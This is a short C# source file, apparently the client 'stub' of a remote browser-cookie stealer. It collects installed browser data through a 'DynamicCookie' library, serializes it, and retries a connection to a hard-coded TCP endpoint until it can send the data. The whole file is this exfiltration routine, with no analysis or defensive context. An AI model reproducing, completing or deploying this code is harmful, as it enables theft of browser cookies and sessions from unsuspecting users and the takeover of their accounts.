using DynamicCookieLibrary.DynamicCookie;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RemoteBrowserStub
{
    static class Program
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            List<Browser> browsers = BrowserAggregator.getInstalledBrowsers();
            byte[] data = Serialization.serialize(browsers);
            TcpClient client = new TcpClient();
            while (!client.Connected)
            {
                try
                {
                    client.Connect("0.0.0.0", 8080);
                }
                catch (SocketException socketException)
                {
                    Debug.Write("SOCKET ERROR : " + socketException.Message);
                }
                catch (Exception exception)
                {
                    Debug.WriteLine("UNKNOWN EXCEPTION : " + exception.Message);
                }
            }
            byte[] lengthData = BitConverter.GetBytes(data.Length);
            NetworkStream stream = client.GetStream();
            stream.Write(lengthData, 0, lengthData.Length);
            stream.Write(data, 0, data.Length);
            Thread.Sleep(10000); //theres a chance the data may not actually send through the "synchronous" Write function. This (maybe) ensures that it (might) send all of the requires bytes.
        }
    }
}
